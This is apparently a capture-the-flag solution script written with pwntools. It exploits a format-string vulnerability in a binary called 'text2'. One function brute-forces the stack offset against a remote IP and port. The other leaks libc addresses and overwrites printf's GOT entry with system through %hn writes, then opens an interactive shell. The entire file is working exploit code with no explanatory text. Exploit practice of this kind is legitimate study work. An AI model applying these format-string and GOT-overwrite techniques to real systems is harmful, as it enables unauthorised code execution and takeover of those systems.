from pwn import *

def offset_finder():
    for x in range (1, 10):
        p = remote("103.200.7.156", 2104)
        
        print "Offset number {}".format(x)

        payload = ""
        payload += "A" * 4
        payload += "%{}$p".format(x)

        p.sendlineafter(">", payload)

        p.recvuntil("AAAA")
        stack_value = p.recvline()
        
        if stack_value.find("41414141") != -1:
            print "Offset found!"
            print "Stack value: {}".format(stack_value)
            break
        else:
            print "Stack value: {}".format(stack_value)
            
        p.close()

def exploit():
    p = process("./text2")
    # p = remote("103.200.7.156", 2104)
    printf_got = 0x80498c8
    gets_got = 0x80498cc

    gdb.attach(p, "b *0x0804858c")
    p.sendlineafter("> ", "%35$p")

    # p.recvuntil("> ")
    #offset sesuatu : 0x18550
    libc_leak = int(p.recvline()[:-1], 16)
    log.info("Libc leak : {}".format(hex(libc_leak)))
    libc_base = libc_leak - 0x018e81
    log.info("Libc base : {}".format(hex(libc_base)))
    libc_system = libc_base + 0x03d200
    log.info("Libc system : {}".format(hex(libc_system)))
    one_gadget = libc_base + 0x67a80
    log.info("One gadget addr : {}".format(hex(one_gadget)))
    overwrite = str(hex(libc_system))[2:]
    first_overwrite = int(overwrite[4:], 16)
    log.info("First overwrite: {} or in hex {}".format(first_overwrite, hex(first_overwrite)))
    second_overwrite = int(overwrite[:4], 16)
    log.info("Second overwrite: {} or in hex {}".format(second_overwrite, hex(second_overwrite)))

    payload = ''
    payload += p32(printf_got)
    payload += p32(printf_got + 2)
    payload += "%7${}p".format(first_overwrite - len(payload))
    payload += "%7$hn"
    payload += "%{}p".format(second_overwrite - first_overwrite)
    payload += "%8$hn"

    p.sendlineafter("> ", payload)

    p.interactive()

if __name__ == "__main__":
    # offset_finder()
    exploit()